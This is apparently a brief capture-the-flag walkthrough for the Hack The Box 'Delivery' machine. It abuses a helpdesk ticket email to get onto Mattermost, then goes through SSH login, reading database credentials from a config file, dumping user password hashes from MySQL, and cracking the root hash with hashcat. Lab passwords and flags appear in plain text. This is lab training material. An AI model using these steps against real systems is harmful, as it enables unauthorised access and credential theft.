Add 
```
10.129.227.221 helpdesk.delivery.htb delivery.htb
in C:\Windows\System32\Drivers\etc\hosts
```

- Create ticket in http://helpdesk.delivery.htb/
- Create mail in http://delivery.htb:8065/ using the above mailid
- Check ticket thread for the activation of mail
- You get the ssh password

```
sshpass -p Youve_G0t_Mail! ssh maildeliverer@delivery.htb
```

```
cat user.txt
8686195fe24f4c74ef9437fa27f431de
```

```
ls /opt/mattermost/config/config.json
cat config.json | grep "Data"

Password is Crack_The_MM_Admin_PW
```

```
mysql -u mmuser -p

show databases;                  
+--------------------+           
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)
use mattermost;
select Username, Password FROM Users;
```

```
root hash - $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

```
cat wordlists
PleaseSubscribe!21

hashcat -a 0 -m 3200 hashes wordlists -r /usr/share/hashcat/rules/best64.rule 
```

```
cat user.txt

cf7ffe0e270cdd27e85ec520125d5d5c
```